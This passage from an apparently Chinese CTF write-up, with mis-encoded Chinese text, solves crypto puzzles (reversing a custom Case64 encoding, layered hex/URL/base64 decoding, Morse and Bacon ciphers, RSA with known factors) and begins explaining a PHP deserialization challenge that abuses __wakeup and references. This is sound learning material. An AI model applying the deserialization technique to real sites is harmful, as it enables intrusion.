python">a = [<span class="hljs-number">103</span>,<span class="hljs-number">107</span>,<span class="hljs-number">97</span>,<span class="hljs-number">96</span>,<span class="hljs-number">122</span>,<span class="hljs-number">48</span>,<span class="hljs-number">104</span>,<span class="hljs-number">48</span>,<span class="hljs-number">113</span>,<span class="hljs-number">86</span>,<span class="hljs-number">48</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">109</span>,<span class="hljs-number">53</span>,<span class="hljs-number">116</span>,<span class="hljs-number">116</span>,<span class="hljs-number">94</span>,<span class="hljs-number">66</span>,<span class="hljs-number">86</span>,<span class="hljs-number">119</span>,<span class="hljs-number">52</span>,<span class="hljs-number">114</span>,<span class="hljs-number">126</span>,<span class="hljs-number">94</span>,<span class="hljs-number">116</span>,<span class="hljs-number">49</span>,<span class="hljs-number">108</span>,<span class="hljs-number">114</span>,<span class="hljs-number">56</span>,<span class="hljs-number">50</span>,<span class="hljs-number">88</span>,<span class="hljs-number">67</span>,<span class="hljs-number">88</span>,<span class="hljs-number">109</span>,<span class="hljs-number">102</span>,<span class="hljs-number">110</span>,<span class="hljs-number">56</span>,<span class="hljs-number">119</span>,<span class="hljs-number">104</span>,<span class="hljs-number">56</span>,<span class="hljs-number">98</span>,<span class="hljs-number">95</span>,<span class="hljs-number">119</span>,<span class="hljs-number">115</span>,<span class="hljs-number">55</span>,<span class="hljs-number">103</span>,<span class="hljs-number">115</span>,<span class="hljs-number">99</span>,<span class="hljs-number">100</span>,<span class="hljs-number">124</span>]<br>b = [<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>]<br>l = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>x = <span class="hljs-built_in">chr</span>(i^b[l])<br>l+=<span class="hljs-number">1</span> <br>print(x,end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/13/kluHVp6Yt4Fzied.png"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Case64ï¼Ÿ"><a href="#Case64ï¼Ÿ" class="headerlink" title="Case64ï¼Ÿ"></a>Case64ï¼Ÿ</h2><p>ç»™å‡ºCase64çš„åŠ å¯†pyæºç (æˆ‘åœ¨åé¢åŠ äº†æ³¨é‡Š)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python">C64_TABLE = [<br>    <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span><br>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">s: <span class="hljs-built_in">str</span></span>):</span><br>    bits = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">bin</span>(byte)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">bytes</span>(s.encode(<span class="hljs-string">&#x27;utf8&#x27;</span>)))[::-<span class="hljs-number">1</span>]<span class="hljs-comment">#é€†åºè¾“å‡ºsçš„äºŒè¿›åˆ¶å½¢å¼</span><br>    length = <span class="hljs-built_in">len</span>(bits)<span class="hljs-comment">#æ±‚è¾“å…¥çš„é•¿åº¦</span><br><br>    <span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length - <span class="hljs-number">1</span>):<span class="hljs-comment">#nä¸ªå­—ç¬¦æ‰§è¡Œ8*næ¬¡</span><br>        bits = bits[:count] + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(bits[count]) ^ <span class="hljs-built_in">int</span>(bits[count+<span class="hljs-number">1</span>])) + bits[count + <span class="hljs-number">1</span>:]<span class="hljs-comment">#å°†æ¯ä¸ªäºŒè¿›åˆ¶ä¸å…¶åçš„ä¸€ä¸ªå­—ç¬¦å¼‚æˆ–å†æ‹¼æ¥</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>            bits = (bits[-<span class="hljs-number">1</span>]+bits[:-<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>]<span class="hljs-comment">#å°†æœ€æœ«ç«¯çš„bitæåˆ°æœ€å‰ç«¯ï¼Œå†é€†åº</span><br>            <br>    left = <span class="hljs-string">&quot;&quot;</span><br>    right = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):<span class="hljs-comment">#å¶æ•°ä½åŒ…æ‹¬0 è¿›å…¥left å¥‡æ•°ä½è¿›å…¥right</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> i % <span class="hljs-number">2</span>):<br>            left += bits[i]<br>        <span class="hljs-keyword">else</span>:<br>            right += bits[i]<br><br>    data = right[:<span class="hljs-built_in">len</span>(right)//<span class="hljs-number">2</span>] + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(byte1) ^ <span class="hljs-built_in">int</span>(byte2)) <span class="hljs-keyword">for</span> byte1, byte2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(left, right)) + right[<span class="hljs-built_in">len</span>(right)//<span class="hljs-number">2</span>:]<br>    <span class="hljs-comment">#//å‘å‰å–æ•´ï¼Œdata=rightå·¦åŠ+leftä¸rightå¼‚æˆ–+rightå³åŠ</span><br><br>    data = data + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(byte % <span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>-<span class="hljs-built_in">len</span>(data) % <span class="hljs-number">6</span>))<br>    <span class="hljs-comment">#data = data + byte%2(å³å–äºŒè¿›åˆ¶)(byte=range(6-dataé•¿åº¦%6))</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(C64_TABLE[<span class="hljs-built_in">int</span>(data[i*<span class="hljs-number">6</span>:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">6</span>], <span class="hljs-number">2</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)//<span class="hljs-number">6</span>))<br>    <span class="hljs-comment">#å°†dataä»¥6ä½äºŒè¿›åˆ¶ä¸ºä¸€ç»„ï¼Œè½¬ä¸ºåè¿›åˆ¶å³ä¸ºåœ¨C64ä¸­çš„ä¸‹æ ‡</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag=<span class="hljs-string">&quot;flag&#123;???&#125;&quot;</span><br>    print(encrypt(flag))<br><br>    <span class="hljs-comment"># result -&gt; _b1QZYJ5GGEjL?ghMbY6GzV3mCuPABc7t_m3S_tTm532vQleV</span><br><br>    <span class="hljs-comment">#111110011011110101010000011001011000001001111001000110000110000100100011001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111010010111110101101010011100110111001110111110110101111010000100101011110</span><br><br></code></pre></td></tr></table></figure><p>ç”±æ­¤å³å¯çŸ¥è§£å¯†æ–¹æ³•ï¼š</p><p><strong>1.å°†dataä»¥6ä½äºŒè¿›åˆ¶ä¸ºä¸€ç»„ï¼Œè½¬ä¸ºåè¿›åˆ¶å³ä¸ºåœ¨C64ä¸­çš„ä¸‹æ ‡</strong><br>è½¬ä¸ºæ•°ç»„ä¸‹æ ‡<br>62,27,53,16,25,24,9,57,6,6,4,35,11,63,32,33,12,27,24,58,6,51,21,55,38,2,46,15,0,1,28,59,45,62,38,55,18,62,45,19,38,57,55,54,47,16,37,30,21</p><p>å†è½¬ä¸ºäºŒè¿›åˆ¶<br>111110011011110101010000011001011000001001111001000110000110000100100011001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111010010111110101101010011100110111001110111110110101111010000100101011110<br>010101</p><p><strong>2.range(6-åŸé•¿åº¦%6)</strong><br>å‡å»å¤šå‡ºçš„é•¿åº¦ï¼š6-dataé•¿åº¦%6<br>è®¾åŸé•¿åº¦ä¸ºx;åˆ™ç°é•¿åº¦ 294=x+(6-x%6)</p><p>6-x%6=6/5/4/3/2/1</p><p>294=x+6/5/4/3/2/1</p><p>x=288/289/290/291/292/293<br>x=288âˆšã€289Xã€290âˆšã€291xã€292âˆšã€293x</p><p>æ•…x=288/290/292(è¿™é‡Œä»288å¼€å§‹è¯•ï¼Œç›´æ¥èƒ½å¾—åˆ°flag)</p><p>right=<br>left=bin(int(â€˜â€™,2)^int(â€˜â€™,2))</p><p>288=&gt;144=&gt;72<br>111110011011110101010000011001011000001001111001000110000110000100100011<br>001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111<br>010010111110101101010011100110111001110111110110101111010000100101011110</p><p>right=111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110<br>left =bin(int(â€˜111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110â€™,2)^int(â€˜001011111111100000100001001100011011011000111010000110110011010101110111100110000010101110001111000000000001011100111011101101111110100110110111â€™,2))<br>     =110101100100010101110001010101000011010001000011000000110101010001010100110100111100000011011100100110111000101011001101000010101110000011101001</p><p><strong>3.å‘å‰å–æ•´ï¼Œdata=rightå·¦åŠ+leftä¸rightå¼‚æˆ–+rightå³åŠ =&gt;æ±‚å¾—left</strong><br>288<br>right=111110011011110101010000011001011000001001111001000110000110000100100011010010111110101101010011100110111001110111110110101111010000100101011110<br>left =110101100100010101110001010101000011010001000011000000110101010001010100110100111100000011011100100110111000101011001101000010101110000011101001</p><p><strong>4.å¶æ•°ä½åŒ…æ‹¬0 è¿›å…¥left å¥‡æ•°ä½è¿›å…¥right</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">bits=<span class="hljs-string">&quot;&quot;</span><br>left  = <span class="hljs-string">&quot;&quot;</span><br>right = <span class="hljs-string">&quot;&quot;</span><br>l=<span class="hljs-number">0</span><br>r=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(left)+<span class="hljs-built_in">len</span>(right)):  <span class="hljs-comment"># å¶æ•°ä½åŒ…æ‹¬0 è¿›å…¥left å¥‡æ•°ä½è¿›å…¥right</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> i % <span class="hljs-number">2</span>):<br>        bits += left[l]<br>        l+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        bits += right[r]<br>        r+=<span class="hljs-number">1</span><br>print(bits)<br></code></pre></td></tr></table></figure><p>288<br>111101110110100101100101011100110011101100000010001101100011000101001010001001000011010101001011000000010100101000110110001000010010011000100101101100100100111111110100010001011011001110100101110000111100111111000001110110011111010110110110010001011101100110101000010000011011100111010110</p><p><strong>5.åŸï¼šå°†æœ€æœ«ç«¯çš„bitæåˆ°æœ€å‰ç«¯ï¼Œå†é€†åºï¼Œ(bits[-1] + bits[:-1])[::-1]</strong> </p><p><strong>ç°ï¼šå…ˆé€†åºï¼Œå†å°†æœ€å‰ç«¯æ”¾åˆ°æœ€åç«¯</strong><br><strong>é€†åºï¼šbits = bits[::-1]</strong><br><strong>å°†æœ€å‰ç«¯æ”¾åˆ°æœ€åç«¯ï¼šbits = bits[2:len(bits)] + bits[0]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>    bits = bits[::-<span class="hljs-number">1</span>]<br>    bits = bits[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(bits)] + bits[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>6.<br><strong>åŸï¼šç”±å‰é¢å¼€å§‹ï¼Œå°†æ¯ä¸ªäºŒè¿›åˆ¶ä¸å…¶åçš„ä¸€ä¸ªå­—ç¬¦å¼‚æˆ–å†æ‹¼æ¥</strong></p><p><strong>ç°ï¼šç”±åé¢å¼€å§‹ï¼Œå°†æ¯ä¸ªäºŒè¿›åˆ¶ä¸å…¶åä¸€ä¸ªå­—ç¬¦å¼‚æˆ–å†æ‹¼æ¥</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bits)-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    bits = bits[:count-<span class="hljs-number">1</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(bits[count-<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">int</span>(bits[count])) + bits[count:]<br></code></pre></td></tr></table></figure><p>ç»¼åˆ5ã€6å³å¾—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> count <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(bits)-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>):<br>        bits = bits[::-<span class="hljs-number">1</span>]<br>        bits = bits[<span class="hljs-number">1</span>:<span class="hljs-built_in">len</span>(bits)] + bits[<span class="hljs-number">0</span>]<br>    bits = bits[:count-<span class="hljs-number">1</span>] + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(bits[count-<span class="hljs-number">1</span>]) ^ <span class="hljs-built_in">int</span>(bits[count])) + bits[count:]<br>print(bits[::-<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆï¼š<br>011001100110110001100001011001110111101101000011001101100011010001011111001100010011010101011111010000000101111100110110001100000111001000110001011011100011100101011111001100110110111001100011011100100111100101110000011101000101111101101101001100110111010001101000001100000110010001111101 </p><p>è½¬æ¢asciiå¾—flag{C64_15_@_60r1n9_3ncrypt_m3th0d}</p><h2 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h2><p>0x253444253534253431253739253439253434253435253737253446253433253431253335253445253739253431253738253444253434253444253637253444253534253439253741253439253434253435253737253445253639253431253738253444253534253633253637253444253534253435253331253439253434253435253738253445253639253431253738253444253434253431253637253444253534253431253738253439253434253642253335253439253434253435253738253444253533253431253738253444253434253431253637253444253534253431253738253439253434253435253739253445253531253344253344(16è¿›åˆ¶)</p><p>%4D%54%41%79%49%44%45%77%4F%43%41%35%4E%79%41%78%4D%44%4D%67%4D%54%49%7A%49%44%45%77%4E%69%41%78%4D%54%63%67%4D%54%45%31%49%44%45%78%4E%69%41%78%4D%44%41%67%4D%54%41%78%49%44%6B%35%49%44%45%78%4D%53%41%78%4D%44%41%67%4D%54%41%78%49%44%45%79%4E%51%3D%3Dï¼ˆurlï¼‰</p><p>MTAyIDEwOCA5NyAxMDMgMTIzIDEwNiAxMTcgMTE1IDExNiAxMDAgMTAxIDk5IDExMSAxMDAgMTAxIDEyNQ==ï¼ˆbase64ï¼‰</p><p>102 108 97 103 123 106 117 115 116 100 101 99 111 100 101 125ï¼ˆasciiï¼‰</p><p>flag{justdecode}</p><h2 id="Ilovebacon"><a href="#Ilovebacon" class="headerlink" title="Ilovebacon"></a>Ilovebacon</h2><p>â€“ â€” .-. â€¦ . ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. ..â€“.- -â€¦ ..- - ..â€“.- -â€¦ .- -.-. â€” -. ..â€“.- .. â€¦ ..â€“.- -.-. â€” â€” .-.. . .-. ..â€“.- .- .- -â€¦ .- -â€¦ .- .- .- .- .- .- .- -â€¦ -â€¦ -â€¦ -â€¦ .- -â€¦ .- -â€¦ .- .- .- .- .- .- -â€¦ -â€¦ -â€¦ .- .- .- .- -â€¦ -â€¦ .- .- .- .- .- .- -â€¦ .- -â€¦ -â€¦ .- .- -â€¦ -â€¦ .- .- .- .- .- .- .- .- -â€¦ .- .- .- .- -â€¦ -â€¦ .- .- -â€¦ -â€¦ -â€¦ .- .- .- .- -â€¦ -â€¦ -â€¦ -â€¦ .- .- .-ï¼ˆæ‘©æ–¯ï¼‰</p><p>morse_is_cool_but_bacon_is_cooler_aababaaaaaaabbbbababaaaaaabbbaaaabbaaaaaababbaabbaaaaaaaabaaaabbaabbbaaaabbbbaaa</p><p>Aababaaaaaaabbbbababaaaaaabbbaaaabbaaaaaababbaabbaaaaaaaabaaaabbaabbbaaaabbbbaaa   =ã€‹   fahvaodalgaegodyï¼ˆåŸ¹æ ¹ï¼‰ =ã€‹ flaghaveagooddayï¼ˆæ …æ ï¼‰<br>flag{haveagoodday}</p><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p><img src="https://i.loli.net/2021/02/13/LeFhwRXJECos1nd.png"></p><p>å¾—åˆ°n<br>è§£å‡ºpã€q<br>åˆ©ç”¨è„šæœ¬ï¼šï¼ˆf=xï¼Œxå–å€¼ä¸ºä¸‰æ®µå¯†æ–‡çš„åè¿›åˆ¶ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">325045504186436346209877301320131277983</span><br>q = <span class="hljs-number">302825536744096741518546212761194311477</span><br>e = <span class="hljs-number">65537</span><br>f = x<br>n = p * q<br>fn = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = gmpy2.invert(e, fn)<br>h = <span class="hljs-built_in">hex</span>(gmpy2.powmod(f, d, n))[<span class="hljs-number">2</span>:]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>  h = <span class="hljs-string">&#x27;0&#x27;</span> + h<br><span class="hljs-built_in">print</span> (d)<br><span class="hljs-built_in">print</span> (h)<br></code></pre></td></tr></table></figure><p>(m1)5077560311513279671817430508125151837396585328082180175253360345086848717946<br>(m2)70099856477856647119324475779448956753505959373194081911451122574748717928011<br>(m3)6793000449683458761243147198477390385097096925500467689087326832717298959098</p><p>æœ€åæ‹¼æ¥è§£å‡ºçš„å¯æ‰“å°å­—ç¬¦å³å¾—flag{3b6d3806-4b2b-11e7-95a0-000c29d7e93d}</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="PHP1"><a href="#PHP1" class="headerlink" title="PHP1"></a>PHP1</h2><p><img src="https://i.loli.net/2021/02/13/YH3cmquvOX7CiZk.png"></p><p>é‡ç½®äº†__wakeup()å‡½æ•°                            #ååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œä¼ å…¥å‚æ•°åº”ä¸ºåºåˆ—åŒ–<br>$this-&gt;password = $nobodyknow;           #passwordå§‹ç»ˆç­‰äºnobodyknowï¼Œpasswordå€¼æ— æ„ä¹‰<br>Private                                                     #privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00ç±»å%00æˆå‘˜å;<br>                                                                #protectedå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯ %00*%00æˆå‘˜å<br>===    Hintï¼šå¼•ç”¨&amp;                                  #è¿™ä¸¤ä¸ªå¯¹è±¡å˜é‡ä¸€å®šè¦æŒ‡å‘æŸä¸ªç±»çš„åŒä¸€ä¸ªå®ä¾‹ï¼ˆå³åŒä¸€ä¸ªå¯¹è±¡ï¼‰</p><p>åœ¨phpä¸­ï¼Œå¼•ç”¨$a=&amp;$b;å®é™…æ˜¯åŒä¸€ä¸ªå†…å®¹æœ‰aå’Œbä¸¤ä¸ªåˆ«åï¼›è€Œä¸æ˜¯åƒcè¯­è¨€ä¸€æ ·çš„æŒ‡é’ˆ</p><p>ä¹Ÿå°±æ˜¯è¯´åˆ©ç”¨å¼•ç”¨&amp;å°†nobodyknowçš„å€¼ä¼ é€’ç»™varify<br>ç±»å±æ€§èµ‹å€¼ï¼šphpä¸­ç±»çš„å±æ€§å£°æ˜æ—¶èµ‹å€¼ä¸€å®šæ˜¯ä¸€ä¸ªç›´æ¥çš„å€¼ï¼Œä¸èƒ½æ˜¯å‡½æ•°è¿”å›å€¼ï¼Œè¡¨è¾¾å¼ï¼Œä»¥åŠé€šè¿‡â€.â€è¿æ¥èµ·æ¥çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœåè¦ç”¨è¿™äº›èµ‹å€¼ï¼Œå¯ä»¥é€šè¿‡æ„é€ å‡½æ•°__construct();    â€”â€”ä¹Ÿå°±æ˜¯è¯´å¦‚varify=&amp;$passwordæˆ–è€…&amp;$nobodyknowçš„è¯­æ³•æ˜¯é”™è¯¯çš„</p><p>å¦‚æœåœ¨ foreach è¯­å¥ä¸­ç»™ä¸€ä¸ªå…·æœ‰å¼•ç”¨çš„å˜é‡èµ‹å€¼ï¼Œè¢«å¼•ç”¨çš„å¯¹è±¡ä¹Ÿè¢«æ”¹å˜ã€‚</p><ul><li>1.ç±»å±æ€§ä»…å…è®¸ä½¿ç”¨ä»¥ä¸‹ç±»å‹çš„æ•°æ®è¿›è¡Œåˆå§‹åŒ–</li><li>æ ‡é‡å’Œæ•°ç»„å­—é¢é‡:å­—ç¬¦ä¸²,æ•°å€¼,å¸¸é‡,æ•°ç»„,åŸå‹æ–‡æ¡£(php5.3+)</li><li>2.ä¸å…è®¸ä½¿ç”¨:å˜é‡,è¡¨è¾¾å¼,å¯¹è±¡</li><li>3.ç±»å¸¸é‡ä½¿ç”¨å…³é”®å­—constå£°æ˜,ä¸å…è®¸è®¾ç½®è®¿é—®é™åˆ¶ç¬¦,å¼ºåˆ¶ä¸ºpublic,ä¸èƒ½æ›´æ”¹</li><li>4.ç±»å¸¸é‡æ˜¯å±æ€§ç±»çš„,ä¸å±æ€§å®ƒçš„æŸä¸ªå®ä¾‹å¯¹è±¡,å¿…é¡»ä½¿ç”¨ç±»æ‰å¯ä»¥è®¿é—®</li><li>5.è®¿é—®ç±»å¸¸é‡è¦ä½¿ç”¨èŒƒå›´è§£æç¬¦::,åŒå†’å·</li><li>åœ¨ç±»ä¸­ä½¿ç”¨å…³é”®å­—selfè¡¨ç¤ºå½“å‰ç±»,åœ¨å¤–éƒ¨å¯ç›´æ¥ä½¿ç”¨ç±»å</li></ul><p>serialize() å¯å¤„ç†é™¤äº† resource ä¹‹å¤–çš„ä»»ä½•ç±»å‹ã€‚ç”šè‡³å¯ä»¥ serialize() é‚£äº›åŒ…å«äº†æŒ‡å‘å…¶è‡ªèº«å¼•ç”¨çš„æ•°ç»„ã€‚serialize() 